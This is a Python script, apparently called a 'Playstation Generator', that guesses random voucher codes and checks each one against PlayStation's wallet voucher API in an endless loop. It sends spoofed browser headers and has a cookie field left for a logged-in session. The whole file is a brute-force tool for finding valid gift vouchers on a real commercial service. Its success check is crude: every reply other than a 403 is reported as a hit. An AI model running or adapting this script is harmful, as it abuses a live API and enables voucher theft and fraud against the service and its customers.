import random
import os
import sys
from colorama import Fore
import requests
import random
from random import randint
gentype = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
g = Fore.GREEN
r = Fore.RED
b = Fore.BLUE
y = Fore.YELLOW
re = Fore.RESET
l = Fore.LIGHTBLACK_EX
blue = Fore.BLUE
payload={}
headers = {
  'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0',
  'Accept': '*/*',
  'Accept-Language': 'en-GB,en;q=0.5',
  'Content-Type': 'application/json',
  'X-Platform': 'CHIHIRO',
  'Access-Control-Max-Age': '600',
  'Origin': 'https://transact.playstation.com',
  'Connection': 'keep-alive',
  'Referer': 'https://transact.playstation.com/',
  'Cookie': '', #Update 
  'Sec-Fetch-Dest': 'empty',
  'Sec-Fetch-Mode': 'cors',
  'Sec-Fetch-Site': 'same-site',
  'TE': 'trailers'
}




def clearscreen():
        os.system("cls")







def mainfunction():
    print(f"Welcome to The {blue}Playstation{re} Generator")
    readyornot = input("Ready? Y/N > ")
    if readyornot == "y":
        clearscreen()
        while True:
            generate1 = random.choice(gentype)
            generate2 = random.choice(gentype)
            generate3 = random.choice(gentype)
            generate4 = random.choice(gentype)
            space1 = "-"
            generate5 = random.choice(gentype)
            generate6 = random.choice(gentype)
            generate7 = random.choice(gentype)
            generate8 = random.choice(gentype)
            space2 = "-"
            generate9 = random.choice(gentype)
            generate10 = random.choice(gentype)
            generate11 = random.choice(gentype)
            generate12 = random.choice(gentype)
            url = "https://web.np.playstation.com/api/graphql/v1/transact/wallets/vouchers/" +  generate1+generate2+generate3+generate4+space1+generate5+generate6+generate7+generate8+space2+generate9+generate10+generate11+generate12 #Fx
            response = requests.request("GET", url, headers=headers, data=payload)
            if requests.get(url).status_code == 403:
                print(f"[{r}ERROR{re}] " + generate1+generate2+generate3+generate4+space1+generate5+generate6+generate7+generate8+space2+generate9+generate10+generate11+generate12)
            else:
                print(f"[{g}SUCCES{re}] " + generate1+generate2+generate3+generate4+space1+generate5+generate6+generate7+generate8+space2+generate9+generate10+generate11+generate12)


    
            



    







if __name__ == "__main__":
    mainfunction()
